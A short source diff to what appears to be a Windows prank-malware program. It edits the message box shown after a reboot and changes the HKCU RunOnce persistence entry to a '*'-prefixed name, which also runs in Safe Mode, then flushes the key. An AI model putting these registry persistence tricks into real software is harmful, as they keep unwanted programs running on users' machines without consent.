@@ -303,7 +303,7 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 		{
 			//Message box after reboot
 			HHOOK hook = SetWindowsHookExA(WH_CALLWNDPROCRET, FckBtn, 0, GetCurrentThreadId());
-			MessageBoxA(0, "Don't worry ur pc is safe, dude.\nHope u didn't smash ur monitor!\n\nCrafted by AleXandro-1337", LOL, MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
+			MessageBoxA(0, "Don't worry ur pc is safe, dude\nHope u didn't smash ur monitor!\n\nCrafted by AleXandro-1337", LOL, MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
 			UnhookWindowsHookEx(hook);
 
 			return 0;
@@ -316,7 +316,8 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 	HKEY safeMsg;
 	LPSTR keyValue = StrCat(exePath, (LPSTR)" safe\0");
 	RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, 0, 0, KEY_ALL_ACCESS, 0, &safeMsg, 0);
-	RegSetValueExA(safeMsg, "lol", 0, REG_SZ, (LPBYTE)keyValue, lstrlenA(keyValue) + 1); //Tell user on startup that it was a joke =D
+	RegSetValueExA(safeMsg, "*lol", 0, REG_SZ, (LPBYTE)keyValue, lstrlenA(keyValue) + 1); //Tell user on startup that it was a joke =D
+	RegFlushKey(safeMsg);
 	RegCloseKey(safeMsg);
 
 	STARTUPINFOA si;
